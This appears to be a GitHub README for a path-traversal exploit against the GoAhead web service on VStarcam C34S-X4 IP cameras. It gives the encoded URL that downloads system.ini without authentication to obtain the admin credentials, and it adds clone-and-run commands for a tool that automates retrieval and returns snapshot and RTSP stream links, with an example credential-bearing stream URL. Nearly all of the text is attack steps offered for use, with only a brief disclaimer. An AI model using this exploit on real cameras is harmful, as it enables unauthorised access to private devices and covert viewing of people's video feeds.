## Authentication Treversal
The Vulnerability of GoAhead Service on VStarcam C34S-X4 that allows you to download system.ini configuration file and get login and password.
--
## !WARNING!
The author is trying to draw the attention of the developers to the problem and I am not responsible for the harm caused to you or by you.
--


# IMPLEMENTATION

Еo perform the vulnerability, you must log in to the camera interface without authorization. Then, after the forward slash, you must add %5C%5Csystem.ini
and the file will start downloading. When you open the file, you will see your username and password written together. I have already written a small program
that interacts with the ONVIF protocol and receives images from the camera and a link to the RTSP stream.

# STEPS
1) To use it you have to install [python3](https://www.python.org)
[onvif_zeep](https://github.com/FalkTannhaeuser/python-onvif-zeep) and [requests](https://pypi.org/project/requests/)
```sh
git clone https://github.com/Retr0-code/auth-treversal
pip3 install -r requirements.txt
chmod +x GetInfo.py
python3 GetInfo.py --help
```
<br>
2) You can go to you browser and enter this link <b>http://ip:port/%5C%5Csystem.ini</b>
(You must change ip to address of camera and port to port that web-server run on).
<br>
![alt text]()
<br>
Or you can use
<br>
```sh
python3 GetInfo.py --host <camera ip> --port <web-server port>
```
<br>
and than read as text downloaded file.
<br>
![alt text]()
<br>
3) Now you can log in to web-panel.
<br>
![alt text]()
Or you can use 
<br>
```sh
python3 GetInfo.py --onvif 10080 --host 192.168.0.58 --port 8888
```
<br>
and you get links to snapshots and RTSP stream link.
To get stream you have to specify login and password like this: <b>rtsp://username:password@ip:port/path/to/stream</b> In my case link looks like
this rtsp://admin:888888@192.168.0.58:554/udp/av0_1
<br>
![alt text]()
